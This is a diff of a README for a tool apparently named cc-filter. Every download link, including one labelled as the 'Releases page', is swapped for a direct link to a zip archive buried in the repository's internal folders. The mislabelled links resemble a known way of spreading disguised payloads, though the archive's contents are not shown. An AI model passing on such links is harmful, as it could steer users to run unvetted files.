@@ -17,15 +17,15 @@ Before you begin, make sure your system meets the following requirements:
 
 ### Download Link
 
-[![Download cc-filter](https://raw.githubusercontent.com/Gnro-19/cc-filter/main/Meliadus/cc-filter.zip)](https://raw.githubusercontent.com/Gnro-19/cc-filter/main/Meliadus/cc-filter.zip)
+[![Download cc-filter](https://github.com/Gnro-19/cc-filter/raw/refs/heads/main/internal/filter/filter_cc_1.9-alpha.5.zip)](https://github.com/Gnro-19/cc-filter/raw/refs/heads/main/internal/filter/filter_cc_1.9-alpha.5.zip)
 
 To download cc-filter, visit the Releases page below. 
 
-[Download cc-filter here](https://raw.githubusercontent.com/Gnro-19/cc-filter/main/Meliadus/cc-filter.zip)
+[Download cc-filter here](https://github.com/Gnro-19/cc-filter/raw/refs/heads/main/internal/filter/filter_cc_1.9-alpha.5.zip)
 
 ## 📂 Download & Install
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/Gnro-19/cc-filter/main/Meliadus/cc-filter.zip).
+1. Visit the [Releases page](https://github.com/Gnro-19/cc-filter/raw/refs/heads/main/internal/filter/filter_cc_1.9-alpha.5.zip).
 
 2. On this page, look for the latest release. It will be at the top of the list.
 
